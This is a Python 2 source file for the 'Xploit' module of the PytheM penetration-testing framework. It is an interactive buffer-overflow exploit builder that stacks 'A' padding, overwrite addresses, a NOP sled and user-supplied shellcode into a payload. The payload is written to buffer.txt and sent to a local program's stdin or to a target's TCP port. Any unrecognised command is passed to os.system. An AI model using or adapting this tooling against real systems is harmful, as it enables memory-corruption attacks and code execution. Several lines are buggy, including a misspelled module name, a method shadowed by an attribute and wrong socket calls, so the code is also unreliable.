#!/usr/bin/env python2.7

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA


import os
import sys
import struct
import resource
import time
from utils import *
from netaddr import IPAddress, AddrFormatError
from subprocess import *
from socket import *



class Exploit(object):

	def __init__(self, target, mode):
		self.target = target
		self.mode = mode
		self.xtype = 'bufferoverflow'
		self.offset = 1
		self.nops = 0
		self.shellcode = ''
		self.lenght = 0
		self.addr1 = None
		self.addr2 = None
		self.arch = 'x86'
		self.port = 0

	def printHelp(self):
		print """\n


		[PytheM - Xploit module]

	TARGET - [ {} ]

[*] help:		Print this help message.


[*] clear:		Clean the screen, same as GNU/Linux OS "clear".


[*] exit/quit:		Return to pythem.


[*] set			Set the variables values.

parameters:

  - offset			| Number os 'A's to overwrite the instruction pointer.

  - addr1			| (Optional) Hexa(0xaddress) First address to overwrite after the offset.

  - addr2			| (Optional) Hexa(0xaddress) Second address to overwrite after the offset.

  - nops			| (Optional) Number of NOPs after IP overwrite or after the addr1 and addr2 if they are set.

  - shellcode			| (Optional) Shellcode (could be generated by msfvenom or any other).

  - lenght			| Total lenght of the payload.

  - arch			| Target system processor architecture.


[*] print		Print a variable's value.

  examples:

   xploit> print offset


[*] decode/encode   Decode or encode a string with a chosen pattern.

  examples:

   xploit> decode hex
   xploit> encode hex


[*] xploit		Run the exploit after all the settings.


[*] fuzz		Start fuzzing on subject.

(If file is passed to xploit will fuzz stdin)
(If target is passed to xploit will fuzz tcp)

The offset's value will be the number of 'A's to send.

[Default = 1]
will be increased in 1 by 1.
example:
 [offset = 10]
 will be increased in 10 by 10.

  examples:

   xploit> fuzz

"""

	def pattern(self,size=1024):
		return "\x41"*size

	def nops(self,size=1024):
		return "\x90"*size

	def int2hexstr(self, num, intsize=4):
		if intsize == 8:
			if num < 0:
				result = strct.pack("<q", num)
			else:
				result = struct.pack("<Q", num)

		else:
			if num < 0:
				result = struct.pack("<l", num)
			else:
				result = struct.pack("<L", num)
		return result

	def list2hexstr(self, intlist, intsize=4):
		result = ""
		for value in intlist:
			if isinstance(value, str):
				result += value
			else:
				result += self.int2hexstr(value, intsize)
		return result

	def run(self):

		padding = self.pattern(self.offset)
		payload = [padding]


		if self.xtype == "bufferoverflow":
			if self.arch == "x86":
				if self.addr1 is not None:
					payload += [self.addr1]
				if self.addr2 is not None:
					payload += [self.addr2]
				if self.nops > 0:
					payload += ["{}".format(self.nops(self.nops))]
				payload += [self.shellcode]
				total = len(payload) - self.lenght
				fill = self.pattern(total)
				payload += [fill]
				payload = self.list2hexstr(payload)
				print "[+] Writing payload into buffer.txt"
				f = open("buffer.txt", "w")
				f.write(payload)

			elif self.arch == "x64":
				if self.addr1 is not None:
					payload += struct.pack("<Q",int(self.addr1))
				if self.addr2 is not None:
					payload += struct.pack("<Q",int(self.addr2))
				if self.nops > 0:
					payload += ["{}".format(self.nops(self.nops))]
				payload += [self.shellcode]
				total = len(payload) - self.lenght
				fill = self.pattern(total)
				payload += [fill]
				payload = self.list2hexstr(payload, 8)
				print "\n[+] Writing payload into buffer.txt\n"
				f = open("buffer.txt", "w")
				f.write(payload)
			else:
				print "[!] Select a valid processor architecture."
				return


		if self.mode == "tcp":
			self.port = input("[+] Enter the tcp port to fuzz: ")
			self.tcppwn(payload)

		elif self.mode == "stdin":
			self.stdinpwn(payload)
		else:
			print "[!] Select a valid mode (stdin or tcp)."

	def stdinpwn(self, payload):
		resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
                resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
                P = Popen(self.target, stdin=PIPE)
                print "[*] Sending buffer with lenght: "+str(len(payload))
		P.stdin.write(payload)
		while True:
			line = sys.stdin.readline()
			P.poll()
			ret = P.returncode
			if ret is None:
				P.stdin.write(line)
			else:
				if ret == -11:
					print "[*] Child program crashed with SIGSEGV"
				else:
					print "[-] Child program exited with code %d" % ret
				break
		print "\n If it does not work automatically, run on terminal: (cat buffer.txt ; cat) | {}".format(self.target)

	def tcppwn(self, payload):
		try:
			self.target = str(IPAddress(self.target))
		except AddrFormatError as e:
			print "[-] Select a valid IP Address as target."
			return

		try:
			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.socket.settimeout(4)
			self.socket.connect((self.target,self.port))
			self.socket.send(payload)
			while True:
				self.socket.recv(1024)
		except KeyboardInterrupt:
			return

		except Exception as e:
			if 'Connection refused' in e:
				print "[-] Connection refused."
				return


	def start(self):
		while True:
			try:
				self.command = raw_input("xploit> ")
				self.argv = self.command.split()
				self.input_list = [str(a) for a in self.argv]

				try:
					if self.input_list[0] == 'exit' or self.input_list[0] == 'quit':
						break

					elif self.input_list[0] == 'help':
						self.printHelp()

					elif self.input_list[0] == 'fuzz':
						try:
							from fuzzer import SimpleFuzz
							self.fuzz = SimpleFuzz(self.target,self.mode,self.offset)

						except KeyboardInterrupt:
							pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)
							pass

					elif self.input_list[0] == 'xploit':
						self.run()

					elif self.input_list[0] == "decode":
						try:
							print decode(self.input_list[1])
						except KeyboardInterrupt:
							pass

					elif self.input_list[0] == "encode":
						try:
							print encode(self.input_list[1])
						except KeyboardInterrupt:
							pass

					elif self.input_list[0] == "print":
						if self.input_list[1] == "offset":
							print "[+] Offset "
							print "[+] lenght: {}".format(self.offset)
						elif self.input_list[1] == "nops":
							print "[+] Nops "
							print "[+] lenght: {}".format(self.nops)
						elif self.input_list[1] == "shellcode":
							print "[+] Shellcode "
							print "[+] lenght: {}".format(self.shellcode)
						elif self.input_list[1] == "lenght":
							print "[+] Total payload lenght "
							print "[+] lenght: {}".format(self.lenght)
						elif self.input_list[1] == "addr1":
							print "[+] First address to overwrite"
							print "[+] memory address 1: {}".format(self.addr1)
						elif self.input_list[1] == "addr2":
							print "[+] Second address to overwrite"
							print "[+] memory address 2: {}".format(self.addr2)
						elif self.input_list[1] == "arch":
							print "[+] Target system arch"
							print "[+] Architecture: {}".format(self.arch)
						else:
						 	print "[-] Select a valid variable name."


					elif self.input_list[0] == "set" or self.input_list[0] == "SET":

						if self.input_list[1] == "offset":
							try:
								self.offset = int(self.input_list[2])
							except IndexError:
								try:
									self.offset = input("[+] Enter the offset (number of 'A's): ")
								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "nops":
							try:
								self.nops = int(self.input_list[2])
							except IndexError:
								try:
									self.nops = input("[+] Enter the NOPsled (number of NOPs): ")

								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "shellcode":
							try:
								self.shellcode = input("[+] Enter the shellcode: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "lenght":
							try:
								self.lenght = int(self.input_list[2])
							except IndexError:
								try:
									self.lenght = input("[+] Enter the payload total lenght: ")
								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "addr1":
							try:
								self.addr1 = input("[+] First address to overwrite: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "addr2":
							try:
								self.addr2 = input("[+] Second address to overwrite: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "arch":
							try:
								self.arch = self.input_list[2]
							except IndexError:
								try:
									self.arch = raw_input("[+] Target system arch: ")
								except KeyboardInterrupt:
									pass

					else:
						try:
							os.system("{}".format(self.command))
							pass
						except Exception as e:
							print "[!] Select a valid option, type help to check sintax."
							pass

				except IndexError:
					pass
				except Exception as e:
					print "[!] Exception caught: {}".format(e)



			except KeyboardInterrupt:
				break

if __name__ == "__main__":
	xploit = Exploit("./vuln")
	xploit.start()
